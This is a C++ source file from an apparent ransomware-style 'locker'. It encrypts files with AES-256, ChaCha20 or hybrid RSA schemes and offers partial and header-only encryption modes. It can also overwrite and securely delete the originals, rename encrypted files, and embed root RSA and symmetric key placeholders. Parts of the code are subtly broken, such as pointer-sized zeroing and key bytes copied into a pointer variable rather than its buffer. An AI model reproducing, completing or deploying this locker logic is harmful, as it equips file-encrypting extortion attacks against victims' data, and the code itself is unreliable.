#include "locker.h"
#include "aes/aes256.h"
#include "chacha20/ecrypt-sync.h"
#include "filesystem.h"
#include "global_parameters.h"
#include "memory.h"
#include "logs.h"


#include <stdio.h>
#include "CommandParser.h"


static bool isCrypt = false;
constexpr unsigned MB = 1048576;

void aes_block_fn(PFILE_INFO FileInfo, crypto_aes_ctx* ctx, u32* padding, BYTE* in, BYTE* out, u32 bytes)
{
	aes_encrypt_blocks(ctx, in, out, bytes, padding, FileInfo->CryptInfo->mode);
}


void chacha_block_fn(PFILE_INFO FileInfo, laced_ctx* ctx, u32* padding, BYTE* in, BYTE* out, u32 bytes)
{
	ECRYPT_encrypt_bytes(ctx, in, out, bytes);
}

static void HandlerGenKeyChaCha(laced_ctx* CryptCtx, CONST BYTE* ChaChaKey, CONST BYTE* ChaChaIV)
{
#ifdef _WIN32
	RtlSecureZeroMemory(CryptCtx, sizeof(CryptCtx));
#else
	memory::memzero_explicit(CryptCtx, sizeof(laced_ctx));
#endif
	ECRYPT_keysetup(CryptCtx, ChaChaKey, 256, 64);
	ECRYPT_ivsetup(CryptCtx, ChaChaIV);
}

static void HandlerGenKeyAES(crypto_aes_ctx* CryptCtx, CONST BYTE* AESKey)
{
#ifdef _WIN32
	RtlSecureZeroMemory(CryptCtx, sizeof(CryptCtx));
#else
	memory::memzero_explicit(CryptCtx, sizeof(crypto_aes_ctx));
#endif
	aes_expandkey(CryptCtx, AESKey);
}

static bool SymmetricMethodState(PFILE_INFO FileInfo)
{
	if (FileInfo->CryptInfo->gen_policy == GENKEY_EVERY_ONCE)
		FileInfo->CryptInfo->gen_key_method(FileInfo->ctx, GLOBAL_KEYS.g_Key, GLOBAL_KEYS.g_IV);

	return FileInfo->CryptInfo->mode_method(FileInfo);
}

static bool HybridMethodStateCrypt(PFILE_INFO FileInfo)
{
	if (!filesystem::FileCryptEncrypt(FileInfo))
	{
		LOG_ERROR("[CryptEncrypt] Failed; " log_str, FileInfo->Filename);
		return false;
	}

	return true;
}

static bool HybridMethodStateDecrypt(PFILE_INFO FileInfo)
{
	if (!filesystem::FileCryptDecrypt(FileInfo))
	{
		LOG_ERROR("[CryptDecrypt] Failed; " log_str, FileInfo->Filename);
		return false;
	}

	return true;
}


static bool RSAOnlyMethodState(PFILE_INFO FileInfo)
{
	if (!filesystem::EncryptRSA(FileInfo))
	{
		LOG_ERROR("[EncryptRSA] Failed Encrypt/Decrypt ONLY RSA; " log_str, FileInfo->Filename);
		return false;
	}

	return true;
}

EncryptAlgoMethod init_hybrid(u32* mode)
{
	if (GLOBAL_ENUM.g_DeCrypt == EncryptCipher::CRYPT)
	{
		*mode = GLOBAL_ENUM.g_EncryptMode == EncryptModes::FULL_ENCRYPT ? MODE_AES::AES_CRYPT : MODE_AES::AES_CRYPT_NO_PADDING; 
		return (EncryptAlgoMethod)HybridMethodStateCrypt;
	}
	else if (GLOBAL_ENUM.g_DeCrypt == EncryptCipher::DECRYPT)
	{
		*mode = GLOBAL_ENUM.g_EncryptMode == EncryptModes::FULL_ENCRYPT ? MODE_AES::AES_DECRYPT : MODE_AES::AES_DECRYPT_NO_PADDING;
		return (EncryptAlgoMethod)HybridMethodStateDecrypt;
	}
	
	LOG_ERROR("[GeneratePolicy] Failed; missing crypt/decrypt");
	return NULL;
	/*ADD FLAG ERROR*/
}

bool locker::CryptoSystemInit(CryptoPolicy policy, PCRYPT_INFO crypt_info)
{
	crypt_info->hash_sum_method = (HashSumFunc)filesystem::nopHashSumFile;
	crypt_info->hash_data.HashList = NULL;
	u32 mode_ = 0;

	switch (policy)
	{
	case CryptoPolicy::AES256:
	{
		auto algm= (EncryptAlgoMethod)init_hybrid(&mode_);
		*crypt_info = 
		{
			.ctx = (crypto_aes_ctx*)memory::m_malloc(sizeof(crypto_aes_ctx)),
			.name = "AES256",
			.mode = mode_,
			.method_policy = CryptoPolicy::AES256,
			.gen_policy = GENKEY_ONCE,
			.crypt_method = (EncryptMethodFunc)aes_block_fn,
			.gen_key_method = (EncryptGenKeyFunc)HandlerGenKeyAES,
			.algo_method = (EncryptAlgoMethod)SymmetricMethodState,
		};
		crypt_info->gen_key_method(crypt_info->ctx, GLOBAL_KEYS.g_Key, GLOBAL_KEYS.g_IV);
		break;
	}
	case CryptoPolicy::CHACHA:
	{
		*crypt_info = 
		{
			.name = "ChaCha20",
			.mode = 0,
			.method_policy = CryptoPolicy::CHACHA,
			.gen_policy = GENKEY_EVERY_ONCE,
			.crypt_method = (EncryptMethodFunc)chacha_block_fn,
			.gen_key_method = (EncryptGenKeyFunc)HandlerGenKeyChaCha,
			.algo_method = (EncryptAlgoMethod)SymmetricMethodState
		};
		break;
	}
	case CryptoPolicy::RSA_AES256:
	{	
		auto algm= (EncryptAlgoMethod)init_hybrid(&mode_);
		*crypt_info = 
		{
			.desc = 
			{
				.key_data = (BYTE*)memory::m_malloc(4096),
				.rsa_path = GLOBAL_PATH.g_PathRSAKey,
#ifdef _WIN32
				.crypto_provider = NULL,
				.handle_rsa_key = NULL,
#else
				.PKEY = NULL,
				.bio = NULL,
#endif
			},
			.name = "RSA_AES256",
			.mode = mode_,
			.method_policy = CryptoPolicy::RSA_AES256,
			.gen_policy = GENKEY_EVERY_ONCE,
			.crypt_method = (EncryptMethodFunc)aes_block_fn,
			.gen_key_method = (EncryptGenKeyFunc)HandlerGenKeyAES,
			.algo_method = algm
		};
		if (!filesystem::ReadRSAFile(crypt_info))
		{
			LOG_ERROR("[ReadRSAFile] Failed; " log_str, crypt_info->desc.rsa_path);
			return false;
		}
		break;
	}
	case CryptoPolicy::RSA_CHACHA:
	{
		auto algm= (EncryptAlgoMethod)init_hybrid(&mode_);
		*crypt_info = 
		{
			.desc = 
			{
				.key_data = (BYTE*)memory::m_malloc(4096),
				.rsa_path = GLOBAL_PATH.g_PathRSAKey,
#ifdef _WIN32
				.crypto_provider = NULL,
				.handle_rsa_key = NULL,
#else
				.PKEY = NULL,
				.bio = NULL,
#endif
			},
			.name = "RSA_CHACHA",
			.mode = mode_,
			.method_policy = CryptoPolicy::RSA_CHACHA,
			.gen_policy = GENKEY_EVERY_ONCE,
			.crypt_method = (EncryptMethodFunc)chacha_block_fn,
			.gen_key_method = (EncryptGenKeyFunc)HandlerGenKeyChaCha,
			.algo_method = algm
		};
		if (!filesystem::ReadRSAFile(crypt_info))
		{
			LOG_ERROR("[ReadRSAFile] Failed; " log_str, crypt_info->desc.rsa_path);
			return false;
		}
		break;
	}
	case CryptoPolicy::RSA:
	{
		auto algm= (EncryptAlgoMethod)init_hybrid(&mode_);
		*crypt_info = 
		{
			.desc = 
			{
				.key_data = (BYTE*)memory::m_malloc(4096),
				.rsa_path = GLOBAL_PATH.g_PathRSAKey,
#ifdef _WIN32
				.crypto_provider = NULL,
				.handle_rsa_key = NULL,
#else
				.PKEY = NULL,
				.bio = NULL,
#endif
			},
			.name = "RSA",
			.mode = 0,
			.method_policy = CryptoPolicy::RSA,
			.gen_policy = NONE,
			.crypt_method = NULL,
			.gen_key_method = NULL,
			.algo_method = (EncryptAlgoMethod)RSAOnlyMethodState
		};
		if (!filesystem::ReadRSAFile(crypt_info))
		{
			LOG_ERROR("[ReadRSAFile] Failed; " log_str, crypt_info->desc.rsa_path);
			return false;
		}
		break;
	}
	default:
		break;		
	}

	crypt_info->overwrite_method = (OverWriteFunc)filesystem::nopOverWriteFile;
	crypt_info->zeros = NULL;
	crypt_info->random = NULL;

	return true;
}


void locker::FreeCryptInfo(CRYPT_INFO* CryptInfo)
{
	if (!CryptInfo)
		return;


	if (CryptInfo->hash_data.HashList)
	{
		PHLIST dataHash = NULL;
		SLIST_FOREACH(dataHash, CryptInfo->hash_data.HashList)
			memory::m_free(dataHash->hash);

		delete CryptInfo->hash_data.HashList;
	}

	if(CommandParser::HASH_FILE)
	{
		delete CryptInfo;
		return;
	}

	if (CryptInfo->zeros)
		memory::m_free(CryptInfo->zeros);
	if (CryptInfo->random)
		memory::m_free(CryptInfo->random);

	if (CryptInfo->desc.key_data)
	{
		memory::memzero_explicit(CryptInfo->desc.key_data, 4096);
		memory::m_free(CryptInfo->desc.key_data);
		CryptInfo->desc.key_data = NULL;
	}

#ifdef _WIN32
	if (CryptInfo->desc.handle_rsa_key)
	{
		BCryptDestroyKey(CryptInfo->desc.handle_rsa_key);
		CryptInfo->desc.handle_rsa_key = NULL;
	}

	if (CryptInfo->desc.crypto_provider)
	{
		BCryptCloseAlgorithmProvider(CryptInfo->desc.crypto_provider, 0);
		CryptInfo->desc.crypto_provider = NULL;
	}
#else
	if (CryptInfo->desc.bio)
		BIO_free(CryptInfo->desc.bio);
	if (CryptInfo->desc.PKEY)
		EVP_PKEY_free(CryptInfo->desc.PKEY);
#endif

	if (CryptInfo->ctx)
	{
		memory::memzero_explicit(CryptInfo->ctx, sizeof(CryptInfo->ctx));
		memory::m_free(CryptInfo->ctx);
		CryptInfo->ctx = NULL;
	}

	delete CryptInfo;
}


bool locker::GeneratePolicy(CRYPT_INFO* CryptInfo)
{
	if(!CryptoSystemInit(GLOBAL_ENUM.g_EncryptMethod, CryptInfo))
	{
		LOG_ERROR("[GeneratePolicy] [CryptoSystemInit] Failed");
		return false;
	}

	if(CommandParser::HASH_FILE)
	{
		CryptInfo->hash_data.HashList = new SLIST<HASH_LIST>;
		CryptInfo->hash_sum_method = (HashSumFunc)filesystem::hash_file;
		return true;
	}
	
	if (CommandParser::signature)
	{
		CryptInfo->hash_data.HashList = new SLIST<HASH_LIST>;
		CryptInfo->hash_sum_method = (HashSumFunc)filesystem::HashSumFile;
	}

	if (GLOBAL_OVERWRITE.g_OverWrite)
	{
		switch (GLOBAL_OVERWRITE.g_OverWriteMode)
		{
		case overwrite::ZEROS:
		{
			CryptInfo->overwrite_method = (OverWriteFunc)filesystem::ZerosOverWriteFile;
			CryptInfo->zeros = (BYTE*)memory::m_malloc(MB);
			memory::memzero_explicit(CryptInfo->zeros, MB);
			CryptInfo->random = NULL;
			break;
		}
		case overwrite::RANDOM:
		{
			CryptInfo->overwrite_method = (OverWriteFunc)filesystem::RandomOverWriteFile;
			CryptInfo->random = (BYTE*)memory::m_malloc(MB);
#ifdef _WIN32
			if (!HandleError
			(BCryptGenRandom(0, CryptInfo->random, MB, BCRYPT_USE_SYSTEM_PREFERRED_RNG)))
			{
				LOG_ERROR("[BCryptGenRandom] Failed");
				return FALSE;
			}
#else
			RAND_bytes(CryptInfo->random, MB);
#endif
			CryptInfo->zeros = NULL;
			break;
		}
		case overwrite::DOD:
		{
			CryptInfo->overwrite_method = (OverWriteFunc)filesystem::DODOverWriteFile;
			CryptInfo->zeros = (BYTE*)memory::m_malloc(MB);
			memory::memzero_explicit(CryptInfo->zeros, MB);
			CryptInfo->random = (BYTE*)memory::m_malloc(MB);
#ifdef _WIN32
			if (!HandleError
			(BCryptGenRandom(0, CryptInfo->random, MB, BCRYPT_USE_SYSTEM_PREFERRED_RNG)))
			{
				LOG_ERROR("[BCryptGenRandom] Failed");
				return FALSE;
			}
#else
			RAND_bytes(CryptInfo->random, MB);
#endif
			break;
		}
		}
		if (CommandParser::O_REWRITE)
			return TRUE;
	}

	if (GLOBAL_ENUM.g_DeCrypt == EncryptCipher::CRYPT) isCrypt = true;

	switch (GLOBAL_ENUM.g_EncryptMode)
	{
	case EncryptModes::FULL_ENCRYPT:
		CryptInfo->mode_method = (OptionEncryptModeFunc)filesystem::OptionEncryptModeFULL;
		break;
	case EncryptModes::PARTLY_ENCRYPT:
		CryptInfo->mode_method = (OptionEncryptModeFunc)filesystem::OptionEncryptModePARTLY;
		break;
	case EncryptModes::HEADER_ENCRYPT:
		CryptInfo->mode_method = (OptionEncryptModeFunc)filesystem::OptionEncryptModeHEADER;
		break;
	case EncryptModes::BLOCK_ENCRYPT:
		CryptInfo->mode_method = (OptionEncryptModeFunc)filesystem::OptionEncryptModeBLOCK;
		break;
	case EncryptModes::AUTO_ENCRYPT:
		CryptInfo->mode_method = (OptionEncryptModeFunc)filesystem::OptionEncryptModeAUTO;
		break;
	case EncryptModes::PIPELINE_ENCRYPT:
		break;
	default:
		LOG_ERROR("[ENCRYPT MODE] Failed; missing state mode");
		return false;
	}

	switch (GLOBAL_ENUM.g_CryptName)
	{
	case NAME::BASE64_NAME:
		CryptInfo->name_method = (OptionNameFunc)filesystem::OptionNameBase;
		break;
	case NAME::HASH_NAME:
		CryptInfo->name_method = (OptionNameFunc)filesystem::OptionNameHash;
		break;
	default:
		CryptInfo->name_method = (OptionNameFunc)filesystem::OptionNameStandart;
		break;
	}

	return true;
}

#ifdef _WIN32
static bool SecureDelete(CONST TCHAR* FilePath)
{
	HANDLE Handle = CreateFileW(FilePath, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (Handle == INVALID_HANDLE_VALUE)
		return false;

	if (SetFilePointer(Handle, 0, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER
		|| !SetEndOfFile(Handle))
		return false;
	CloseHandle(Handle);
	return DeleteFileW(FilePath);
}
#else
static bool SecureDelete(CONST CHAR* FilePath)
{
	int desc = api::OpenFile(FilePath);
	if (desc == -1)
		return FALSE;
	if (!api::SetPoint(desc, 0) || ftruncate(desc, 0) == -1)
	{
		api::CloseDesc(desc);
		return FALSE;
	}
	fsync(desc);
	api::CloseDesc(desc);
	return unlink(FilePath) == 0;
}

#endif


bool locker::SetOptionFileInfo(PFILE_INFO FileInfo, PDRIVE_INFO data, CRYPT_INFO* CryptInfo)
{
	*FileInfo = 
	{
		.dcrypt = (int)GLOBAL_ENUM.g_DeCrypt,
		.ctx = NULL,
		.CryptInfo = CryptInfo,
		.Filename = data->Filename,
		.newFilename = NULL,
		.FilePath = data->FullPath,
		.FileHandle = INVALID_HANDLE_VALUE,
		.newFileHandle = INVALID_HANDLE_VALUE,
		.Filesize = 0,
		.padding = 0
	};

	if((FileInfo->newFilename = filesystem::NameMethodState(CryptInfo, data)) == NULL)
	 	return false;

	if (CryptInfo->gen_policy == GENKEY_EVERY_ONCE)
	{
		if (CryptInfo->method_policy == CryptoPolicy::CHACHA
			|| CryptInfo->method_policy == CryptoPolicy::RSA_CHACHA)
			FileInfo->ctx = (laced_ctx*)memory::m_malloc(sizeof(laced_ctx));
		else
			FileInfo->ctx = (crypto_aes_ctx*)memory::m_malloc(sizeof(crypto_aes_ctx));
	}
	else if (CryptInfo->gen_policy == GENKEY_ONCE)
		FileInfo->ctx = CryptInfo->ctx;

	if (!filesystem::getParseFile(FileInfo) || FileInfo->FileHandle == INVALID_HANDLE_VALUE)
	{
		LOG_ERROR("[SetOptionFileInfo] [ParseFile] Failed; " log_str, data->Filename);
		return false;
	}
	
	if(GLOBAL_STATE.g_write_in)
	{
		FileInfo->newFileHandle = FileInfo->FileHandle;
	}
	else if (!filesystem::CreateFileOpen(FileInfo) || FileInfo->newFileHandle == INVALID_HANDLE_VALUE)
	{
		LOG_ERROR("[SetOptionFileInfo] [CreateFileOpen] Failed; " log_str, data->Filename);
		return false;
	}

	return true;
}

void locker::free_file_info(PFILE_INFO FileInfo, bool success)
{
	if (FileInfo->FileHandle != INVALID_HANDLE_VALUE)
		api::CloseDesc(FileInfo->FileHandle);
	if (FileInfo->newFileHandle != INVALID_HANDLE_VALUE)
		api::CloseDesc(FileInfo->newFileHandle);

	if (!success) SecureDelete(FileInfo->newFilename);
	else if (GLOBAL_STATE.g_FlagDelete && !GLOBAL_STATE.g_write_in)
	{
		if (!SecureDelete(FileInfo->FilePath))
			LOG_ERROR("[SecureDelete] Failed; " log_str, FileInfo->Filename);
	}
	else if(GLOBAL_STATE.g_write_in)
		rename(FileInfo->FilePath, FileInfo->newFilename);
	
	memory::m_free(FileInfo->newFilename);
	if (FileInfo->CryptInfo->gen_policy == GENKEY_EVERY_ONCE && FileInfo->ctx) memory::m_free(FileInfo->ctx);
	memory::memzero_explicit(FileInfo, sizeof(FILE_INFO));
}

bool locker::HandlerCrypt
(
	CRYPT_INFO* CryptInfo,
	PDRIVE_INFO data
)
{
	LOG_INFO("process file; " log_str, data->Filename);
	bool success = false;
	FILE_INFO FileInfo;
	if (!(success = SetOptionFileInfo(&FileInfo, data, CryptInfo)))
		goto END;

	if (!(success = CryptInfo->algo_method(&FileInfo)))
		goto END;

	if (!CryptInfo->overwrite_method(CryptInfo, FileInfo.FileHandle, FileInfo.Filesize))
		LOG_ERROR("[OverWriteFile] Failed; " log_str, data->Filename);

	if (CommandParser::signature &&
		CryptInfo->hash_sum_method
		(
			CryptInfo,
			isCrypt ? FileInfo.FileHandle : FileInfo.newFileHandle,
			isCrypt ? FileInfo.Filename : FileInfo.newFilename
		));

	if(success)
		LOG_SUCCESS("success encrypt file; " log_str, data->Filename);
	else
		LOG_ERROR("failed encrypt file; " log_str, data->Filename);

END:
	free_file_info(&FileInfo, success);
	return success;
}

void locker::LoadPublicRootKey(BYTE** g_PublicKeyRoot, DWORD* size)
{
	BYTE pub[] = "__public_key__"; // "\x06\x02\x00" Root RSA Public key / Type -print while gen keys
	*size = sizeof(pub);
	*g_PublicKeyRoot = (BYTE*)memory::m_malloc(4096);
	if (!g_PublicKeyRoot) return;
	memcpy(*g_PublicKeyRoot, pub, *size);
	memory::memzero_explicit((VOID*)pub, *size);
}

void locker::LoadPrivateRootKey(BYTE** g_PrivateKeyRoot, DWORD* size)
{
	BYTE prv[] = "__private_key__"; // "\x07\x02\x00" Root RSA Private key / Type -print while gen keys
	*size = sizeof(prv);
	*g_PrivateKeyRoot = (BYTE*)memory::m_malloc(4096);
	if (!g_PrivateKeyRoot) return;
	memcpy(*g_PrivateKeyRoot, prv, *size);
	memory::memzero_explicit((VOID*)prv, *size);
}

void locker::LoadRootSymmetricKey(BYTE** g_RootKey, BYTE** g_RootIV)
{
	BYTE root_key[] = "____________ROOT_KEY____________";
	BYTE root_iv[] = "ROOT__IV";
	*g_RootKey = (BYTE*)memory::m_malloc(32);
	*g_RootIV = (BYTE*)memory::m_malloc(8);
	if (!g_RootKey || !g_RootIV)
		return;
	memcpy(g_RootKey, root_key, 32);
	memcpy(g_RootIV, root_iv, 8);
	memory::memzero_explicit((VOID*)root_key, sizeof(root_key));
	memory::memzero_explicit((VOID*)root_iv, sizeof(root_iv));
}